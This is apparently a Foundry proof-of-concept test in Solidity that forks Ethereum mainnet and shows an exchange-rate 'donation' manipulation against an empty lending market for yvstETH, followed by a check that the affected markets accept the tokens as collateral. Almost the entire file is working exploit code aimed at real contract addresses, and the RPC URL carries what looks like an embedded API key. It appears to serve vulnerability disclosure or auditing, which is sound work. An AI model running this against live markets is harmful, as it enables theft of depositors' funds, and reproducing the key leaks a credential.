// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/interface.sol";

contract PoC is Test{
    IERC20 yvstETH = IERC20(0x5faF6a2D186448Dfa667c51CB3D695c7A6E52d8E);
    ICErc20Delegate yvstETH_Market = ICErc20Delegate(0xD904235Dc0CD28f42AEECc0CD6A7126d871edaa4);
    ICErc20Delegate yvIRON_Market = ICErc20Delegate(0xb7159DfbAB6C99d3d38CFb4E419eb3F6455bB547);
    ICointroller unitroller = ICointroller(0x4dCf7407AE5C07f8681e1659f626E114A7667339);
    function setUp() public{
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/cTrc4K5LR0jvtNv875uTLvGIDGhv9nCi");
        payable(address(0)).transfer(address(this).balance);
        deal(address(yvstETH),address(this),1000 * 1e18);
    }
    function test_exchangeRate_manipuration() public {
        // First step, Deposit a small amount of yvstETH to the empty yvstETH_Market pool to obtain shares
        
        yvstETH.approve(address(yvstETH_Market), type(uint256).max);
        yvstETH_Market.mint(4 * 1e8);
        yvstETH_Market.redeem(yvstETH_Market.totalSupply() - 2); // completing the initial deposit, the shares of yvstETH_Market and the amount of yvstETH in yvstETH_Market are at a minimum

        // Second step, Donate a large amount of yvstETH to the yvstETH_Market pool to increase the exchangeRate(the number of yvstETH represented by each share)
        (,,, uint256 before_exchangeRate) = yvstETH_Market.getAccountSnapshot(address(this));
        
        console.log("exchangeRate before manipulation:", before_exchangeRate);
        
        uint256 donationAmount = yvstETH.balanceOf(address(this));
        yvstETH.transfer(address(yvstETH_Market), donationAmount); // "donation" exchangeRate manipulation
        
        (,,, uint256 after_exchangeRate) = yvstETH_Market.getAccountSnapshot(address(this));
        console.log("exchangeRate after manipulation:", after_exchangeRate);
    }
    function test_check_collateralFactorMantissa() public{
        (,uint collateralFactorMantissa,)=unitroller.markets(address(yvstETH_Market));
        assert(collateralFactorMantissa > 0);
        console.log("yvstETH_Market collateralFactorMantissa : ", collateralFactorMantissa);
        
        (,collateralFactorMantissa,)=unitroller.markets(address(yvIRON_Market));
        assert(collateralFactorMantissa > 0);
        console.log("yvIRON_Market collateralFactorMantissa : ", collateralFactorMantissa);
    }
}
